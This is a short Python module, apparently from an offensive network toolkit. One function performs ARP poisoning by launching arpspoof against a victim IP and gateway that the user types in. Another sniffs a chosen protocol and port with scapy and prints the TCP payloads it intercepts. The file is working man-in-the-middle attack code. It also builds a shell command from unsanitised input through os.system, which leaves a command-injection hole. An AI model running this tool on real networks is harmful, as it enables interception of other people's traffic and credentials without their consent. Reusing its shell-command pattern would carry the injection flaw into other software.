import socket
socket.has_ipv6=False
from scapy.all import *
from scapy.layers.inet import TCP
from helpers.utils import output
import os

def arpoisoner(out_lck):

    output(out_lck, "Arp Poisoner")

    output(out_lck, "Please insert interface's name: ")
    intf = input()

    output(out_lck, "Please insert victim IP (Ex 0.10x): ")
    victimip = input()

    output(out_lck, "Please insert gateway IP: ")
    gatewayip = input()

    os.system("xterm -e \"arpspoof -i %s -t %s %s\"" % (intf, victimip, gatewayip))

def analyzer(out_lck):

    output(out_lck, "Analizer")
    output(out_lck, "Please insert protocol: (Ex 'tcp' or 'udp')")
    protocol = input()

    output(out_lck, "Please insert port number: ")
    port = input()

    a = sniff(filter="%s and port %s" % (protocol, port), prn=lambda x: x[TCP].payload)

